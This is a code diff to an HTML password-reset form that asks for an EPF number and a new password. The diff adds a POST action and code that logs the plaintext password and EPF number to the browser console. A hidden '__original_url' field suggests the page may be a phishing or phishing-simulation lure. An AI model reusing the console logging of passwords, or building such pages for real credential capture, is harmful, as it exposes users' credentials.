@@ -12,7 +12,7 @@
 <div class="form-section" id="form-container">
 <div class="logo"><img alt="Logo" src="logo.jpg"/></div>
 
-<form id="password-form" onsubmit="handleFormSubmission(event)">
+<form id="password-form" action="/submit-password" method="POST" onsubmit="handleFormSubmission(event)">
     <input name="__original_url" type="hidden" value="https://google.com"/>
     <h2>Reset Your Password</h2>
     <label for="epf-number">EPF Number</label> 
@@ -56,6 +56,7 @@
     function handleFormSubmission(event) {
         event.preventDefault();
 
+        const epfNumber = document.getElementById('epf-number').value;
         const newPassword = document.getElementById('new-password').value;
         const confirmPassword = document.getElementById('confirm-password').value;
         const errorMessage = document.getElementById('error-message');
@@ -66,6 +67,16 @@
         }
 
         errorMessage.style.display = 'none';
+
+        // Grabbing form data for submission
+        const formData = {
+            epfNumber: epfNumber,
+            newPassword: newPassword
+        };
+
+        console.log('Form Data:', formData); // You can remove this in production
+
+        // Simulate form submission
         showPopup();
     }
 
